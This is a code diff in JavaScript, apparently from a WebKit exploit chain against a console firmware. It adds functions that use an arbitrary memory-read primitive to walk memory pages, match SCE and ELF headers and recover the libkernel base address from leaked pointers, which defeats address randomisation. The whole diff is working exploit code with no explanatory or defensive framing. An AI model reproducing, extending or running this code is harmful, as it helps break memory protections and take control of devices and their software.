@@ -305,7 +305,11 @@ export function resolveExtListVote(p, extHexList, off, webkitBase, opts) {
         }
     }
 
-    if (!votes.size) return null;
+    if (!votes.size) {
+        opts._voteRank = [];
+        opts._voteDiag = "0 hdr in " + maxPages + "pg×" + extHexList.length;
+        return null;
+    }
 
     const ranked = [];
     votes.forEach(function (ent, key) {
@@ -342,6 +346,113 @@ export function resolveExtListVote(p, extHexList, off, webkitBase, opts) {
         }
     }
     return null;
+}
+
+/** ≤6 reads — webkit-relative libkernel guesses (below webkit, 16KB-aligned). */
+export function tryWebkitNearLibkernel(p, webkitBase, off) {
+    if (!p || !webkitBase) return null;
+    const cands = estimateLibkernelCandidates(webkitBase, null);
+    const ctx = { webkitBase, off };
+    for (let i = 0; i < cands.length; i++) {
+        const lk = parseAddrSync(cands[i].hex.replace(/^0x/i, ""));
+        if (!lk || !lkAligned(lk)) continue;
+        if (ptrInWebkitImage(lk, webkitBase, off)) continue;
+        const mag = read4p(p, lk);
+        if (mag == null) continue;
+        const v = verifyLibkernelBase(p, lk, off, ctx);
+        if (v.ok && v.strong)
+            return { lk, via: "wk-near+" + cands[i].why, k__error: null };
+        if (v.ok || weakLibkernelBaseHit(p, lk, mag, ctx))
+            return { lk, via: "wk-near-weak+" + cands[i].why, k__error: null, weak: true };
+    }
+    return null;
+}
+
+/** k__error subtract then page-align — 13.52 imports rarely land aligned raw. */
+export function resolveExtAlignedKError(p, fnPtr, off, webkitBase) {
+    if (!fnPtr || fnPtr.hi < 0x8) return null;
+    const ctx = { fnPtr, webkitBase, off };
+    const errs = kErrorCandidates(off);
+    for (let i = 0; i < errs.length; i++) {
+        const raw = fnPtr.sub32(errs[i]);
+        const tries = [raw, pageAlignDown(raw, 0x4000)];
+        for (let t = 0; t < tries.length; t++) {
+            const lk = tries[t];
+            if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
+            const mag = read4p(p, lk);
+            if (mag == null) continue;
+            const v = verifyLibkernelBase(p, lk, off, ctx);
+            if (v.ok && v.strong)
+                return { lk, via: "align-k+" + errs[i].toString(16), k__error: errs[i], fnPtr };
+            if (v.ok || weakLibkernelBaseHit(p, lk, mag, ctx))
+                return { lk, via: "align-k-weak+" + errs[i].toString(16), k__error: errs[i], fnPtr, weak: true };
+        }
+    }
+    return null;
+}
+
+/** One deep walk from lowest ext ptr only — avoids 7× walk OOM. */
+export function resolveMinExtDeepWalk(p, extHexList, off, webkitBase, maxPages) {
+    if (!p || !extHexList || !extHexList.length) return null;
+    maxPages = maxPages != null ? maxPages : 128;
+    let minPtr = null;
+    let minHex = null;
+    let minB = null;
+    for (let i = 0; i < extHexList.length; i++) {
+        const raw = String(extHexList[i]).replace(/^0x/i, "").trim();
+        if (!raw) continue;
+        const fp = parseAddrSync(raw);
+        if (!fp || fp.hi < 0x8) continue;
+        const b = ptrBig(fp);
+        if (minB == null || b < minB) {
+            minB = b;
+            minPtr = fp;
+            minHex = raw;
+        }
+    }
+    if (!minPtr) return null;
+
+    const ctx = { fnPtr: minPtr, webkitBase, off };
+    let page = pageAlignDown(minPtr, 0x4000);
+    let nullStreak = 0;
+    let pages = 0;
+    const magSeen = [];
+    for (let i = 0; i < maxPages; i++) {
+        if (!page || !plausibleLkBeforeRead(page, minPtr, webkitBase, off)) break;
+        pages++;
+        const magic = read4p(p, page);
+        if (magic == null) {
+            nullStreak++;
+            if (nullStreak >= 8) break;
+            page = page.sub32(0x4000);
+            continue;
+        }
+        nullStreak = 0;
+        if (magSeen.length < 4)
+            magSeen.push("0x" + (magic >>> 0).toString(16));
+        if (magic === SCE_MAGIC || magic === ELF_MAGIC || weakLibkernelBaseHit(p, page, magic, ctx)) {
+            const v = verifyLibkernelBase(p, page, off, ctx);
+            if (v.ok || weakLibkernelBaseHit(p, page, magic, ctx)) {
+                const kOff = Number(ptrBig(minPtr) - ptrBig(page));
+                return {
+                    lk: page,
+                    via: "min-walk+k=" + kOff.toString(16),
+                    k__error: kOff,
+                    fnPtr: minPtr,
+                    from: minHex,
+                    pages: pages,
+                    magSeen: magSeen,
+                };
+            }
+        }
+        page = page.sub32(0x4000);
+    }
+    return {
+        miss: true,
+        from: minHex,
+        pages: pages,
+        magSeen: magSeen,
+    };
 }
 
 function kErrorCandidates(off) {
